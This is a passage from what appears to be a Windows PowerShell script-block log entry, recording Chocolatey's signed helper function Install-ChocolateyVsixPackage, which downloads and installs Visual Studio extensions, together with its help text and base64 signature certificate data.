cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgY21LEp9apuTMLqguzypSjDhrQ2TRe8edZGc6 # /Wjr8LIwDQYJKoZIhvcNAQEBBQAEggEAVqid4PiRvy3Rz95AXsqvb7v8clOSDutY # mBU2Njes3J1iOx+jQbU5SD02i04upCKFeaeNN9FfzidZa4Q88uoeirKsKi0UGrjr # BnUIzamzRNRO7w3LLz4ctku8eFoEsNtkclcXy6HW3cubvQ9UUmznObLjlWY42hvl # /vVvzRJYkQyC3LlO5ny2obm6e7ZjiCRSNpasr9SAfoudEhmU/O3nAtayW3KstSwX # 6YGEEdcYKiK9PuPYg4PgPP7tgQMNhN4hQkM4pwL2DvGPDO0Z9TKJpm/uaANdw7Fc # WlJL1zMlIuOtVrHtVX7emS1O+9k7eSaGPbo+SYHmjbUXGQXS/U0/SaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU5WjAjBgkqhkiG9w0BCQQxFgQU40gRxQX/DFfRvsp9 # uY236RUSX6swDQYJKoZIhvcNAQEBBQAEggEAdNctgo5xpF4Yvn6HDB1eWkeD2J7v # Ac6OQH2uoibswWMoa5QyXi4xmc8g4WULeNS32RyBeFWIicGr7We77EffVS6wvC2n # jjxXHuq1Lid5gxE7GgKs54GONcDbWCK7sWJ00qmkP7qrWMp5IrQxpNwgCuMTNBeL # ijKPb9xC3QnbiY9DOFoc5dc6fvFNAj93MqWi1tZUG524Fk+anAAYmExlUxDUmMPW # y8H2MnE9UtQFNSClb8KRZY9gkcpuOrR3dZsCU9deoW4qt8Y9zZ6SnjibCfHbuslP # EJ42K0/lJvs/KZRRjhscT8dOo732rd96hqXJjR9x6YnHdEEODbRXSxSHyA== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Install-ChocolateyVsixPackage.ps1 ¦ ScriptBlockId: 4e87fa77-e30d-47ca-b9c5-bb9d212f6ce6 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Install-ChocolateyVsixPackage { <# .SYNOPSIS Downloads and installs a VSIX package for Visual Studio .DESCRIPTION VSIX packages are Extensions for the Visual Studio IDE. The Visual Studio Gallery at http://visualstudiogallery.msdn.microsoft.com/ is the public extension feed and hosts thousands of extensions. You can locate a VSIX Url by finding the download link of Visual Studio extensions on the Visual Studio Gallery. .NOTES Chocolatey works best when the packages contain the software it is managing and doesn't require downloads. However most software in the Windows world requires redistribution rights and when sharing packages publicly (like on the community feed), maintainers may not have those aforementioned rights. Chocolatey understands how to work with that, hence this function. You are not subject to this limitation with internal packages. .INPUTS None .OUTPUTS None .PARAMETER PackageName The name of the package - while this is an arbitrary value, it's recommended that it matches the package id. In 0.10.4+, `Name` is an alias for PackageName. .PARAMETER VsixUrl The URL of the package to be installed. Prefer HTTPS when available. Can be HTTP, FTP, or File URIs. In 0.10.4+, `Url` is an alias for VsixUrl. .PARAMETER VsVersion The major version number of Visual Studio where the package should be installed. This is optional. If not specified, the most recent Visual Studio installation will be targetted. NOTE: For Visual Studio 2015, the VsVersion is 14. It can be determined by looking at the folders under Program Files / Program Files (x86). In 0.10.4+, `VisualStudioVersion` is an alias for VsVersion. .PARAMETER Checksum The checksum hash value of the Url resource. This allows a checksum to be validated for files that are not local. The checksum type is covered by ChecksumType. **NOTE:** Checksums in packages are meant as a measure to validate the originally intended file that was used in the creation of a package is the same file that is received at a future date. Since this is used for other steps in the process related to the community repository, it ensures that the file a user receives is the same file a maintainer and a moderator (if applicable), plus any moderation review has intended for you to receive with this package. If you are looking at a remote source that uses the same url for updates, you will need to ensure the package also stays updated in line with those remote resource updates. You should look into [automatic packaging](https://chocolatey.org/docs/automatic-packages) to help provide that functionality. **NOTE:** To determine checksums, you can get that from the original site if provided. You can also use the [checksum tool available on the community feed](https://chocolatey.org/packages/checksum) (`choco install checksum`) and use it e.g. `checksum -t sha256 -f path\to\file`. Ensure you provide checksums for all remote resources used. .PARAMETER ChecksumType The type of checkum that the file is validated with - valid values are 'md5', 'sha1', 'sha256' or 'sha512' - defaults to 'md5'. MD5 is not recommended as certain organizations need to use FIPS compliant algorithms for hashing - see https://support.microsoft.com/en-us/kb/811833 for more details. The recommendation is to use at least SHA256. .PARAMETER Options OPTIONAL - Specify custom headers. Available in 0.9.10+. .PARAMETER File Will be used for VsixUrl if VsixUrl is empty. Available in 0.10.7+. This parameter provides compatibility, but should not be used directly and not with the community package repository until January 2018. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # This downloads the AutoWrockTestable VSIX from the Visual Studio # Gallery and installs it to the latest version of VS. Install-ChocolateyVsixPackage -PackageName ""MyPackage"" ` -VsixUrl http://visualstudiogallery.msdn.microsoft.com/ea3a37c9-1c76-4628-803e-b10a109e7943/file/73131/1/AutoWrockTestable.vsix .EXAMPLE > # This downloads the AutoWrockTestable VSIX from the Visual Studio # Gallery and installs it to Visual Studio 2012 (v11.0). Install-ChocolateyVsixPackage -PackageName ""MyPackage"" ` -VsixUrl http://visualstudiogallery.msdn.microsoft.com/ea3a37c9-1c76-4628-803e-b10a109e7943/file/73131/1/AutoWrockTestable.vsix ` -VsVersion 11 .LINK Install-ChocolateyPackage .LINK Install-ChocolateyInstallPackage .LINK Install-ChocolateyZipPackage #> param( [alias(""name"")][parameter(Mandatory=$true, Position=0)][string] $packageName, [alias(""url"")][parameter(Mandatory=$false, Position=1)][string] $vsixUrl, [alias(""visualStudioVersion"")][parameter(Mandatory=$false, Position=2)][int] $vsVersion = 0, [parameter(Mandatory=$false)][string] $checksum = '', [parameter(Mandatory=$false)][string] $checksumType = '', [parameter(Mandatory=$false)][hashtable] $options = @{Headers=@{}}, [alias(""fileFullPath"")][parameter(Mandatory=$false)][string] $file = '', [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($vsixUrl -eq '' -or $vsixUrl -eq $null) { $vsixUrl = $file } if($vsVersion -eq 0) { if ([System.IntPtr]::Size -eq 4) { <# 32bits system case #> $versions=(get-ChildItem HKLM:SOFTWARE\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName -match ""^[0-9\.]+$"") } | ? {$_.property -contains ""InstallDir""} | sort {[int]($_.PSChildName)} -descending) } else { $versions=(get-ChildItem HKLM:SOFTWARE\Wow6432Node\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName -match ""^[0-9\.]+$"") } | ? {$_.property -contains ""InstallDir""} | sort {[int]($_.PSChildName)} -descending) } if($versions -and $versions.Length){ $version = $versions[0] }elseif($versions){ $version = $versions } } else { if ([System.IntPtr]::Size -eq 4) { <# 32bits system case #> $versions=(get-ChildItem HKLM:SOFTWARE\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName.EndsWith(""$vsVersion.0"")) } | ? {$_.property -contains ""InstallDir""}) } else { $version=(get-ChildItem HKLM:SOFTWARE\Wow6432Node\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName.EndsWith(""$vsVersion.0"")) } | ? {$_.property -contains ""InstallDir""}) } } if ($version) { $vnum=$version.PSPath.Substring($version.PSPath.LastIndexOf('\')+1) if($vnum -as [int] -lt 10) { throw ""This installed VS version, $vnum, does not support installing VSIX packages. Version 10 is the minimum acceptable version."" } $dir=(get-itemProperty $version.PSPath ""InstallDir"").InstallDir $installer = Join-Path $dir ""VsixInstaller.exe"" } if ($installer) { $download=""$env:TEMP\$($packageName.Replace(' ','')).vsix"" try{ Get-ChocolateyWebFile $packageName $download $vsixUrl -checksum $checksum -checksumType $checksumType -Options $options } catch { throw ""There were errors attempting to retrieve the vsix from $vsixUrl. The error message was '$_'."" } Write-Debug ""Installing VSIX using $installer"" $exitCode = Install-Vsix ""$installer"" ""$download"" if($exitCode -gt 0 -and $exitCode -ne 1001) { #1001: Already installed throw ""There was an error installing '$packageName'. The exit code returned was $exitCode."" } } else { throw ""Visual Studio is not installed or the specified version is not present."" } } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCAwvbwbcXwGHARv # s0aL6zHGEwZUxYCbjjh5ZcXDMGFCc6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # 